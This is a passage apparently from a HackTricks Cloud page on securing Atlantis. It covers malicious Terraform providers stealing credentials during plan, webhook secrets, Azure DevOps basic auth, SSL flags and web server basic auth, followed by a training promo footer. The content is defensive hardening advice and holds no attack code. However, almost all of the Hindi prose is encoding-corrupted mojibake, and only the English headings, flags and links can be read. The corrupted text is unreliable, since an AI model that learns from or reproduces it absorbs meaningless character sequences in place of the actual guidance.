рдкреНрд░рджрд╛рддрд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдХреЗ `terraform plan` рдореЗрдВ рджреБрд╖реНрдЯ рдХреЛрдб рдЪрд▓рд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдпрд╣ рдХреЛрдб рдлрд┐рд░ рдЖрдкрдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

1. рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЛ Atlantis рдЫрд╡рд┐ рдореЗрдВ рдмреЗрдХ рдХрд░реЗрдВ рдпрд╛ рд╣реЛрд╕реНрдЯ рдХрд░реЗрдВ рдФрд░ рдЙрддреНрдкрд╛рджрди рдореЗрдВ рдИрдЧреНрд░реЗрд╕ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВред
2. рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ рдкреНрд░рджрд╛рддрд╛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдФрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдИрдЧреНрд░реЗрд╕ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ, рдЗрд╕ рддрд░рд╣ рдЖрдк рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдХрд┐рд╕рдХреЗ рдкрд╛рд╕ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рд╣реИред
3. рдЕрдкрдиреЗ [рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди](https://www.runatlantis.io/docs/server-side-repo-config.html) рдХреЗ `plan` рдЪрд░рдг рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЕрд╡реИрдз рдкреНрд░рджрд╛рддрд╛рдУрдВ рдпрд╛ рдбреЗрдЯрд╛ рд╕реНрд░реЛрддреЛрдВ рдпрд╛ рдЕрдиреБрдорддрд┐ рди рджрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рд╕реЗ PRs рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рдЦрд┐рд▓рд╛рдл рдорд╛рдиреНрдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЖрдк рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░ рдЕрддрд┐рд░рд┐рдХреНрдд рдорд╛рдиреНрдпрддрд╛ рднреА рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ PR рдкрд░ "thumbs-up" рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХрд░рдирд╛ рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ `plan` рдЬрд╛рд░реА рд░рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рдПред Conftest рдпрд╣рд╛рдБ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

#### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis рдХреЛ `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` рдкрд░реНрдпрд╛рд╡рд░рдг рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реЗрдЯ рдХрд┐рдП рдЧрдП Webhook secrets рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред `--repo-allowlist` рдзреНрд╡рдЬ рд╕реЗрдЯ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдмрд┐рдирд╛ webhook secret рдХреЗ, рд╣рдорд▓рд╛рд╡рд░ рдЙрди рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ Atlantis рдкрд░ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ allowlisted рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдХреЗ рд░реВрдк рдореЗрдВ рджрд┐рдЦрддреЗ рд╣реИрдВред Webhook secrets рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рд╡реЗрдмрд╣реБрдХ рдЕрдиреБрд░реЛрдз рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЖрдкрдХреЗ VCS рдкреНрд░рджрд╛рддрд╛ (GitHub рдпрд╛ GitLab) рд╕реЗ рдЖ рд░рд╣реЗ рд╣реИрдВред

рдпрджрд┐ рдЖрдк Azure DevOps рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ webhook secrets рдХреЗ рдмрдЬрд╛рдп рдПрдХ рдмреБрдирд┐рдпрд╛рджреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдЬреЛрдбрд╝реЗрдВред

#### Azure DevOps Basic Authentication <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps рд╕рднреА рд╡реЗрдмрд╣реБрдХ рдШрдЯрдирд╛рдУрдВ рдореЗрдВ рдПрдХ рдмреБрдирд┐рдпрд╛рджреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╣реЗрдбрд░ рднреЗрдЬрдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЗ рд╡реЗрдмрд╣реБрдХ рд╕реНрдерд╛рди рдХреЗ рд▓рд┐рдП HTTPS URL рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

#### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

рдпрджрд┐ рдЖрдк webhook secrets рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдкрдХрд╛ рдЯреНрд░реИрдлрд╝рд┐рдХ HTTP рдкрд░ рд╣реИ, рддреЛ webhook secrets рдЪреБрд░рд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред `--ssl-cert-file` рдФрд░ `--ssl-key-file` рдзреНрд╡рдЬреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SSL/HTTPS рд╕рдХреНрд╖рдо рдХрд░реЗрдВред

#### Enable Authentication on Atlantis Web Server <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

рд╡реЗрдм рд╕реЗрд╡рд╛ рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдХреНрд╖рдо рдХрд░рдирд╛ рдЕрддреНрдпрдзрд┐рдХ рдЕрдиреБрд╢рдВрд╕рд┐рдд рд╣реИред `--web-basic-auth=true` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ BasicAuth рд╕рдХреНрд╖рдо рдХрд░реЗрдВ рдФрд░ `--web-username=yourUsername` рдФрд░ `--web-password=yourPassword` рдзреНрд╡рдЬреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд░реЗрдВред

рдЖрдк рдЗрдиреНрд╣реЗрдВ рдкрд░реНрдпрд╛рд╡рд░рдг рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` рдФрд░ `ATLANTIS_WEB_PASSWORD=yourPassword`ред

### References

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
